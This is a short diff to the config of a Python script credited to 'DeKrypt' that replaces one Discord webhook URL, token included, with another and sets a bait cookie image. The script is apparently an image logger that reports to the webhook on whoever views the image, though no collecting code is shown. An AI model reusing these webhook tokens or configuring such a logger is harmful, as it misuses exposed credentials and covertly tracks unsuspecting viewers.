@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1131501497377640519/dGCtkiRznfVNhg6PGBj0B4SdlzCYYpJ2mZ6FPDEQ7Tn8Ip0XDF7u_95DF5mb2zrmuN_v",
+    "webhook": "https://discord.com/api/webhooks/1160602275102871754/Dkk__EklnURp6NHPVzD_v0zsTX3LDqbSiUbSoMPEINzoM_MXyjwzmUa8V6MimTHe8gu4",
     "image": "https://chipcitycookies.com/wp-content/uploads/2023/01/Chocolate_Chip-6.png", # You can also have a custom image by using a URL argument
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
